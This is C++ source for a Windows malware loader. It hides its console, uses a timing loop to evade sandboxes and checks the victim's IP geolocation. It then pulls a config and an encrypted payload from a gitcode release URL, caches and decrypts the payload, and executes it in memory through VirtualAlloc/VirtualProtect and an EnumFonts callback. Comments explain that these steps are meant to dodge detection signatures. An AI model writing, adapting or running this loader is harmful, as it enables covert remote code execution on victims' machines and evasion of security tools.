// #include <iostream>
// #include <fstream>
// #include <string>
#include <vector>
#include <windows.h>
// #include <chrono>
#include <thread>
// #include <random>
// #include <algorithm>
// #include <numeric>
// #include <functional>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
// #include <sstream>

using namespace std;
using namespace std::chrono;

// claude 4.6 opus 厉害喵, 喵喵喵喵喵喵 !!!!!!!!!!!!

int ddt() {
        int counter = 1;
        auto start_time = high_resolution_clock::now();
        
        while (true) {
            auto current_time = high_resolution_clock::now();
            auto duration = duration_cast<seconds>(current_time - start_time);
            if (duration.count() >= 5) break;
            counter++;
        }
        
        if (counter < 90000000) return 1;

        return 0;
}

vector<unsigned char> download_to_memory(const char* url) {
    vector<unsigned char> data;
    HINTERNET hInternet = InternetOpenA("Download", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return data;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl) {
        unsigned char buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            data.insert(data.end(), buffer, buffer + bytesRead);
        }
        InternetCloseHandle(hUrl);
    }
    InternetCloseHandle(hInternet);
    return data;
}

const char* find_value(const char* json, const char* key) {
    static char buffers[8][5];
    static int buf_idx = 0;
    char* buffer = buffers[buf_idx];
    buf_idx = (buf_idx + 1) % 8;
    char search_key[256];
    search_key[0] = '"';
    int k = 0;
    while(key[k] && k < 250) { 
        search_key[k+1] = key[k]; 
        k++; 
    }
    search_key[k+1] = '"';
    search_key[k+2] = '\0';
    const char* pos = strstr(json, search_key);
    if (!pos) return nullptr;
    pos = strchr(pos, ':');
    if (!pos) return nullptr;
    
    while (*pos && (*pos == ':' || *pos == ' ' || *pos == '"')) pos++;
    
    int i = 0;
    while (*pos && *pos != '"' && *pos != ',' && *pos != '}' && i < 511) {
        if (*pos == '\\' && *(pos + 1) != '\0') {
            pos++;
        }
        buffer[i++] = *pos++;
    }
    buffer[i] = 0;
    return buffer;
}

vector<unsigned char> load_from_cache(const char* version) {
    vector<unsigned char> data;
    char path[MAX_PATH];
    // GetTempPathA(MAX_PATH, path);
    GetEnvironmentVariableA("LOCALAPPDATA", path, MAX_PATH);
    strcat_s(path, MAX_PATH, "\\sk\\");
    CreateDirectoryA(path, NULL);
    lstrcatA(path, version);
    
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return data;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    data.resize(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    return data;
}

void save_to_cache(const char* version, const vector<unsigned char>& data) {
    char path[MAX_PATH];
    // GetTempPathA(MAX_PATH, path);
    GetEnvironmentVariableA("LOCALAPPDATA", path, MAX_PATH);
    strcat_s(path, MAX_PATH, "\\sk\\");
    CreateDirectoryA(path, NULL);
    lstrcatA(path, version);
    
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, data.data(), data.size(), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

bool CheckProcessName() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* filename = strrchr(path, '\\');
    if (!filename) filename = path;
    else filename++;
    return _stricmp(filename, "support_sk.exe") == 0;
}

// ============ 加密 ============
// void encrypt_data(vector<unsigned char>& data, const char* key, int key_len) {
//     if (data.empty() || key_len == 0) return;
    
//     unsigned int seed = 0;
//     for (int i = 0; i < key_len; i++) seed = seed * 31 + (unsigned char)key[i];
    
//     // 第一遍：正向加法
//     unsigned char state = (unsigned char)(seed & 0xFF);
//     for (size_t i = 0; i < data.size(); i++) {
//         unsigned char k = (unsigned char)key[i % key_len];
//         data[i] = (unsigned char)(data[i] + k + state);
//         state = (unsigned char)(state + data[i] + 0x9E);
//     }
    
//     // 第二遍：反向加法（不同常数）
//     state = (unsigned char)((seed >> 8) & 0xFF);
//     for (size_t i = data.size(); i > 0; i--) {
//         size_t idx = i - 1;
//         unsigned char k = (unsigned char)key[idx % key_len];
//         data[idx] = (unsigned char)(data[idx] + k + state);
//         state = (unsigned char)(state + data[idx] + 0x6B);
//     }
// }
// ============ 解密 ============
void decrypt_data(vector<unsigned char>& data, const char* key, int key_len) {
    if (data.empty() || key_len == 0) return;
    
    unsigned int seed = 0;
    for (int i = 0; i < key_len; i++) seed = seed * 31 + (unsigned char)key[i];
    
    // 逆第二遍：反向减法
    unsigned char state = (unsigned char)((seed >> 8) & 0xFF);
    for (size_t i = data.size(); i > 0; i--) {
        size_t idx = i - 1;
        unsigned char k = (unsigned char)key[idx % key_len];
        unsigned char enc = data[idx];
        data[idx] = (unsigned char)(data[idx] - k - state);
        state = (unsigned char)(state + enc + 0x6B);
    }
    
    // 逆第一遍：正向减法
    state = (unsigned char)(seed & 0xFF);
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char k = (unsigned char)key[i % key_len];
        unsigned char enc = data[i];
        data[i] = (unsigned char)(data[i] - k - state);
        state = (unsigned char)(state + enc + 0x9E);
    }
}

int ip_cn(const char* allowlocation) {
    vector<unsigned char> data_ip = download_to_memory("https://vv.video.qq.com/checktime?otype=ojson");
    if (data_ip.empty()) return 2;
    data_ip.push_back(0);
    const char* ip = find_value((const char*)data_ip.data(), "ip");
    if (!ip) return 2;
    char url[512];
    wsprintfA(url, "https://opendata.baidu.com/api.php?co=&resource_id=6006&oe=utf8&query=%s", ip);
    vector<unsigned char> data_location = download_to_memory(url);
    if (data_location.empty()) return 2;
    data_location.push_back(0);
    const char* location = find_value((const char*)data_location.data(), "location");
    if (!location) return 2;
    return (strstr(location, allowlocation) != NULL) ? 0 : 1;
}


// 方案1：EnumFonts 回调（看起来像在枚举字体）
bool execute_payload(vector<unsigned char>& data) {
    if (data.empty()) return false;
    
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return false;
    
    auto pVA = (decltype(&VirtualAlloc))GetProcAddress(k32, "VirtualAlloc");
    auto pVP = (decltype(&VirtualProtect))GetProcAddress(k32, "VirtualProtect");
    if (!pVA || !pVP) return false;
    
    LPVOID mem = pVA(NULL, data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return false;
    
    // 逐字节复制（避免 memcpy 特征）
    unsigned char* dst = (unsigned char*)mem;
    for (size_t i = 0; i < data.size(); i++) {
        dst[i] = data[i];
    }
    
    Sleep(300);
    
    DWORD old;
    if (!pVP(mem, data.size(), PAGE_EXECUTE_READ, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return false;
    }
    
    Sleep(200);
    
    // 用 EnumFonts 回调执行，而不是直接调用
    HDC hdc = GetDC(NULL);
    EnumFonts(hdc, NULL, (FONTENUMPROCA)mem, 0);
    ReleaseDC(NULL, hdc);
    
    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

int run() {
    vector<unsigned char> configData = download_to_memory("https://gitcode.com/asapaka/asapaka/releases/download/1/config.json");
    const char* json = (const char*)configData.data();
    const char* enable = find_value(json, "enable");
    if (lstrcmpA(enable, "false")) return 2;
    if (lstrcmpA(enable, "true") != 0) return 1;
    const char* version = find_value(json, CheckProcessName() ? "version" : "version_first");
    const char* file_url = find_value(json, CheckProcessName() ? "file_url" : "file_url_first");
    const char* ps = find_value(json, "ps");
    const char* allowlocation = find_value(json, "allowlocation");

    int result_ip = ip_cn(allowlocation);
    if (result_ip == 1) return 2;
    if (result_ip == 2) return 1;

    vector<unsigned char> fileData = load_from_cache(version);
    if (fileData.empty()) {
        fileData = download_to_memory(file_url);
        if (fileData.empty()) return 1;
        save_to_cache(version, fileData);
    }

    decrypt_data(fileData, ps, 15);

    execute_payload(fileData);

    // LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // memcpy(execMemory, fileData.data(), fileData.size());
    // typedef void (*SFunc)();
    // SFunc sFunc = (SFunc)execMemory;
    // sFunc();

    // VirtualFree(execMemory, 0, MEM_RELEASE);
    return 0;
}

int main() {
    int result;

    FreeConsole();

    if (ddt() == 1) return 1;

    do {
        result = run();
    } while (result != 0 && result != 2);

    return 0;
}
